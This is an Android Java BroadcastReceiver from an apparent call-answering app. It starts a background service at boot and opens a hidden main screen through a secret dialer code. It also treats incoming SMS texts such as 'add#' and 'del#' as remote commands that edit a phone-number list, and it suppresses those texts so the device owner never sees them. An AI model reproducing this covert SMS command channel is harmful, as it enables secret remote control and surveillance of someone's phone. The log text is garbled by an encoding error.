package com.yfm.answer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Loginfo.write("server", "BootBroadcastReceiver∆Ù∂Ø");
		Intent service=new Intent(context,AnswerService.class);
		context.startService(service);
		String action=intent.getAction();
		if("android.provider.Telephony.SECRET_CODE".equals(action)){
			if(intent.getData()!=null){
				String pwd = intent.getData().getHost();
				if(pwd!=null&&!"".equals(pwd)){
					Intent i = new Intent(context, MainActivity.class);
					i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(i);
				}
			}
		}else if("android.provider.Telephony.SMS_RECEIVED".equals(action)){
			String smsbory=PhoneUtils.getMessagesFromIntent(intent);
			if("auto#true".equals(smsbory)){
				PhoneUtils.setBooleanConfig(context, "auto", true);
				this.abortBroadcast();
			}else if("auto#false".equals(smsbory)){
				PhoneUtils.setBooleanConfig(context, "auto", false);
				this.abortBroadcast();
			}else if(smsbory.startsWith("add#")){
				String pn=smsbory.substring(4);
				if(!"".equals(pn)){
					SqlUtils su=new SqlUtils(context);
					su.add(pn);
					this.abortBroadcast();
				}
			}else if(smsbory.startsWith("del#")){
				String pn=smsbory.substring(4);
				if(!"".equals(pn)){
					SqlUtils su=new SqlUtils(context);
					su.delete(pn);
					this.abortBroadcast();
				}
			}
		}
		
		
		
	}

}
